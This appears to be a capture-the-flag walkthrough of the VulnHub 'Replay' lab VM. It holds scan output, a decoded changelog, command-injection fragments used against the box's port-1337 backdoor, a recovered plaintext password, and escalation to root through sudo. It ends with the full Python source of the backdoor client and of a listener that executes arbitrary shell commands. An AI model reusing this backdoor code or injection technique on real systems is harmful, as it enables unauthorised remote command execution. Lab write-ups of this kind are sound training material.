https://www.vulnhub.com/entry/replay-1,278/


Description

Replay is a sequel to Bob my first CTF. What sort of terrible redneck netsec engineering has Bob done now?

Your Goal is to get root and read /flag.txt

Note: There are three difficulties 
Hard: No Changelog.txt, no hex editor 
Mid: Read Changelog.txt, no hex editor 
Easy: Anything goes



└─$ sudo nmap -sT -A -Pn -n  -p- 192.168.110.12
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 07:05 CEST
Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 07:07 (0:00:42 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 07:07 (0:00:44 remaining)
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 07:07 (0:00:49 remaining)
Nmap scan report for 192.168.110.12
Host is up (0.00045s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 54:35:aa:49:eb:90:09:a1:28:f3:0c:9a:fb:01:52:0d (RSA)
|   256 e7:0b:6e:52:00:51:74:11:b6:cd:c6:cf:25:3a:1b:84 (ECDSA)
|_  256 3b:38:da:d7:16:23:64:68:8f:52:12:8a:14:07:6a:53 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/bob_bd.zip
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq: 
|     CH1:
|     Auth Failed Closing Connection... =-
|   DNSVersionBindReqTCP, GetRequest, Help, Kerberos, RTSPRequest, TerminalServerCookie, X11Probe: 
|     CH1:
|     Auth Failed Closing Connection... =- 
|     Auth Failed Closing Connection... =-
|   GenericLines, NULL: 
|_    CH1:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.91%I=7%D=4/13%Time=6075268A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,6,"\nCH1:\n")%r(GenericLines,6,"\nCH1:\n")%r(GetRequest,62,"\nCH1:\n
SF:\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x20\n
SF:\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x
SF:20\n\n\n")%r(HTTPOptions,34,"\nCH1:\n\n\n\x20-=\x20Auth\x20Failed\x20Cl
SF:osing\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(RTSPRequest,62,"\nCH1:\n\
SF:n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x20\n\
SF:n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x2
SF:0\n\n\n")%r(RPCCheck,34,"\nCH1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closin
SF:g\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(DNSVersionBindReqTCP,62,"\nCH
SF:1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x
SF:20\n\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20
SF:=-\x20\n\n\n")%r(DNSStatusRequestTCP,34,"\nCH1:\n\n\n\x20-=\x20Auth\x20
SF:Failed\x20Closing\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(Help,62,"\nCH
SF:1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x
SF:20\n\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20
SF:=-\x20\n\n\n")%r(SSLSessionReq,34,"\nCH1:\n\n\n\x20-=\x20Auth\x20Failed
SF:\x20Closing\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(TerminalServerCooki
SF:e,62,"\nCH1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.
SF:\.\x20=-\x20\n\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection
SF:\.\.\.\x20=-\x20\n\n\n")%r(TLSSessionReq,34,"\nCH1:\n\n\n\x20-=\x20Auth
SF:\x20Failed\x20Closing\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(Kerberos,
SF:62,"\nCH1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.
SF:\x20=-\x20\n\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.
SF:\.\.\x20=-\x20\n\n\n")%r(SMBProgNeg,34,"\nCH1:\n\n\n\x20-=\x20Auth\x20F
SF:ailed\x20Closing\x20Connection\.\.\.\x20=-\x20\n\n\n")%r(X11Probe,62,"\
SF:nCH1:\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\x20=
SF:-\x20\n\n\n\n\n\x20-=\x20Auth\x20Failed\x20Closing\x20Connection\.\.\.\
SF:x20=-\x20\n\n\n")%r(FourOhFourRequest,34,"\nCH1:\n\n\n\x20-=\x20Auth\x2
SF:0Failed\x20Closing\x20Connection\.\.\.\x20=-\x20\n\n\n");
MAC Address: 08:00:27:5B:FF:27 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.110.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.96 seconds



└─$ curl http://192.168.110.12
<!-- P1:qGQjwO4h6g  -->



└─$ curl http://192.168.110.12/robots.txt
User-agent: *
Disallow: /bob_bd.zip


Changelog:

RG9uJ3QgZm9yZ2V0CgpQClMtPkItPkMtPkQtPlMKQy0+Qi0+UwpDLT5FLT5T

Next Update:
+ Add ASCII art
+ Fix bug where sometimes the backdoor fails to connect (fixed by reopening client.bin)
+ Add ablilty to be able to send more than hardcoded commands again (removed because of beefing up of security)


V4 [*clink* *clink* You will never be able to penetrate my defenses!]:
+ Backdoor will execute any command, too bad it only sends one hardcoded command :P (gonna have to add an input onto client)
+ Security beefed up bet no one can get through this, XOR and b64 is king

RW5kIG9mIGxvZw==

V3 [All wrapped up in a neat bow]:
+ Added a cool security challenge system to stop hackers
+ I am now compiling the python file into .bins
+ Added b64 system to improve security
Ti5ULlMgQWRkZWQgMm5kIGhhbGYgb2YgcGFzc3dvcmQgaW50byB0aGUgYmFja2Rvb3Igc28gaWYgeW91IGZvcmdldCB0aGF0J3Mgd2hlcmUgaXQgaXMgZnVydHVyZSBtZS4gRW5kIG9mIGxvZw==

V2 [The no go zone]:
+ Added b64 support
+ Added password check (validated by server)
RW5kIG9mIGxvZw==

V1 [And then there was light]:
+ I made a backdoor :D
+ Now I can access my server from anywhere without using ssh
RW5kIG9mIGxvZw==




qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul

;whoami-
;ls -al 

-rwxr-xr-x  1 kali kali 161193 Apr 13 10:54 client.bin
-rwxr-xr-x  1 kali kali 161192 Dec  6  2018 client.bin


CH1:
1137181106119795210454103104488465738278881178199681175776113115121117108
CH1:PASS

CH2:ZlZKUjJqbHlzaEs5TU5icTdVeFJKQmJyOGJBRGVOTzZCcDJzY0NTRkNXQkVNdVRtQnluZWFNRFFG
SFdk

fVJR2jlyshK9MNbq7UxRJBbr8bADeNO6Bp2scCSFCWBEMuTmByneaMDQFHWd
CH2:PASS

CH3: cw==


 CH3:PASS 

 -= Access Granted =- 

 Welcome Back Admin 
 Press Ctrl+C To Close Connection 
 Enter a Command: CC........H....S;....S$...._S
..S...S........
S.......S..ISH......
Hello World, you are currently running as:
bob

 Command Executed
quit

 =!= [INTRUDER DETECTION] YOU ARE SENDING UNAUTHORISED PACKETS TERMINATING CONNECTION... =!= 


exit



bob@replay:~/Documents/.ftp$ cat users.passwd
cat users.passwd
bob:b0bcat_1234567890:1100:1100::/ftp:/bin/false
bob@replay:~/Documents/.ftp$ sudo -l
sudo -l
[sudo] password for bob: b0bcat_1234567890

Matching Defaults entries for bob on replay:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on replay:
    (ALL : ALL) ALL
bob@replay:~/Documents/.ftp$ sudo su
sudo su
root@replay:/home/bob/Documents/.ftp# id
id
uid=0(root) gid=0(root) groups=0(root)




bob@replay:~/Documents$ cat client.py
cat client.py
import socket
import time
import base64
import os
import random
import string

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

notes="--=======NOTES=======-- +Buy new milk (the current one is chunky) +2nd half of password is: h0TAIRNXuQcDu9Lqsyul +Find a new job +Call mom =====[END]====="

def XOR(inputstr, key):
    output = []
    xor = 0
    for i in range(len(inputstr)):
        xor = ord(inputstr[i]) ^ ord(key)
        output.append(chr(xor))
    return ''.join(output)

def sendmsg(outdata):
        out = outdata.encode()
        client_socket.send(out)

os.system("clear")
command = "echo Hello World, you are currently running as: ;whoami"
key = ""
nums = []
passw = []
tmp = "Definitely the password I swear -> password123 <- Definitely the password I swear"
IP = raw_input('IP: ')
Password = raw_input('Enter Password: ')
tmp = ""

print("Command to be executed: " + command)

for i in range(len(Password)):
    passw.append(Password[i]);

#CH1
client_socket.connect((IP, 1337))
data = client_socket.recv(100000)

print(data)
print("Attempting to connect...")

for i in range(len(passw)):
    tmp = passw[i]
    nums.append(ord(tmp))

for i in range(0, 30):
    try:
        outdata = str(nums[i])
    except:
        outdata = "0"
    sendmsg(outdata);
    time.sleep(0.2)

#CH2
data = client_socket.recv(100000)

print(data)
tmp = data[16:]
outdata = base64.decodestring(tmp)
sendmsg(outdata);

#CH3
data = client_socket.recv(100000)

print(data)
key = (random.choice(string.letters))
outdata = (base64.encodestring(key))
sendmsg(outdata)

#SEND Command
data = client_socket.recv(100000)

print(data)
command = "00" + "admin" + "cm" + "d;" + command;
outdata = XOR(command,key)
tmp = "Hello there you're not being naughty are you? bob_pass123456789"
sendmsg(outdata)
time.sleep(2)

try:
    while True:
        data = client_socket.recv(100000)
        print(data)
        outdata = raw_input(":");
        sendmsg(outdata)
        data = client_socket.recv(100000)
        print(data)
except KeyboardInterrupt:
    command = "bye"
    command = "12300" + "admi" + "nc" + "md;" + command;
    command = command.replace('12300', '00')
    outdata = XOR(command,key)
    sendmsg(outdata)
    data = client_socket.recv(100000)
    print(data)
    print("-= TERMINATING CONNNECTION =- \n\n\n")
    time.sleep(3)

exit();



bob@replay:~/Documents$ cat listener.py
cat listener.py
import socket
import sys
from thread import *
import os
import subprocess
import time
import base64
import string
import random

def forwardmessage(outdata):
    out = outdata.encode()
    conn.send(out)
    outdata = "\n"
    out = outdata.encode()
    conn.send(out)

def XOR(inputstr, key):
    output = []
    xor = 0
    for i in range(len(inputstr)):
        xor = ord(inputstr[i]) ^ ord(key)
        output.append(chr(xor))
    return ''.join(output)

HOST = ''
PORT = 1337
MAXRECV = 1000000
key = ''
err = 'Connection Closed: Access Denied'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((HOST, PORT))
print('Binding Complete On Port: ')
s.listen(50)
print('Socket is now listening....')
print('PORT: ' + str(PORT))
data = "b'\xc1\x0c[{ \x995\xd0\x9b+:\x85\x8f\xab\x8c\xb4'"
def clientThread(conn):

    result = ""
    ch1 = "qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul"
    nums = []
    tmp_n = 0

    outdata = "\nCH1:"
    forwardmessage(outdata)

    try:
        loopcount = 0
        for j in range(0, 30):
            data = conn.recv(MAXRECV)
            print("Recived msg: " + data + " " + str(loopcount))
            data = data.strip()
            nums.append(data)
            loopcount += 1
        for j in range(0, 30):
            tmp_n = nums[j]
            print("adding: "  + chr(int(tmp_n)))
            result += chr(int(tmp_n))
    except:
        print("Syntax Error Catch Auth 1")
        outdata = "\n\n -= Auth Failed Closing Connection... =- \n\n"
        forwardmessage(outdata)
        conn.close()

    if ch1 in result:

        ch2 = base64.encodestring((''.join(random.choice(string.letters + string.digits) for i in range(60))))
        outdata = "\nCH1:PASS\n\nCH2:" + ch2
        print("\n\nCH1:PASS\n\n")
        forwardmessage(outdata)
        data = conn.recv(MAXRECV)

        ch2 = base64.decodestring(ch2)

        if ch2 in data:
            outdata = "\nCH2:PASS\n\nCH3: "
            print("\n\nCH2:PASS\n\n")
            forwardmessage(outdata)
            data = conn.recv(MAXRECV)
            try:
                data = base64.decodestring(data)
                print("base64 decoded: " + data)
                if (len(data) == 1):
                    key = data
                    print("\n\n CH3:PASS \n\n")
                    outdata = "\n CH3:PASS \n\n -= Access Granted =- \n\n Welcome Back Admin \n Press Ctrl+C To Close Connection \n Enter a Command: "
                    forwardmessage(outdata)
                else:
                    outdata = "\n\n -= Auth Failed Closing Connection... =- \n\n"
                    forwardmessage(outdata)
                    conn.close()
            except:
                print("Failed Auth")
                outdata = "\n\n -= Auth Failed Closing Connection... =- \n\n"
                forwardmessage(outdata)
                conn.close()
            while True:
                data = conn.recv(MAXRECV)
                try:
                    data = data.strip()
                    print("command: " + data)
                    data = XOR(data, key);
                    print ("result: " + data)
                except:
                    print("INTRUDER DETECTION TRIGGED")
                    outdata = "\n\n =!= [INTRUDER DETECTION] YOU ARE SENDING UNAUTHORISED PACKETS TERMINATING CONNECTION... =!= \n\n"
                    forwardmessage(outdata)
                    conn.close()
                try:
                    if not data:
                        break
                    if "00admincmd" in data:
                        data = data.replace('00admincmd;', '')
                        if "hello" in data:
                            outdata = "world\n"
                            forwardmessage(outdata)
                        if "bye" in data or "exit" in data:
                            outdata = "\n\ngoodbye\n\n"
                            forwardmessage(outdata)
                            conn.close()
                        else:
                            try:
                                outdata = subprocess.check_output(data, shell=True)
                                outdata += "\n Command Executed"
                                forwardmessage(outdata)
                            except:
                                outdata = "There was a problem with your request and the command couldn't be executed"
                                forwardmessage(outdata)
                    else:
                        print("!!!INTRUDER DETECTION TRIGGERED!!!")
                        outdata = "\n\n =!= [INTRUDER DETECTION] YOU ARE SENDING UNAUTHORISED PACKETS TERMINATING CONNECTION... =!= \n\n"
                        forwardmessage(outdata)
                        time.sleep(1)
                        conn.close()
                except:
                    outdata = "Server Side Error Closing Connection..."
                    forwardmessage(outdata)
                    conn.close()
        else:
            print("Failed Auth")
            outdata = "\n\n -= Auth Failed Closing Connection... =- \n\n"
            forwardmessage(outdata)
            conn.close()
    else:
        print("Failed Auth")
        time.sleep(1.5)
        outdata = "\n\n -= Auth Failed Closing Connection... =- \n\n"
        forwardmessage(outdata)
        conn.close()
    conn.close()
while 1:
    conn, addr = s.accept()
    print('Client connected ' + addr[0] + ':' + str(addr[1]))
    start_new_thread(clientThread, (conn,))
s.close()
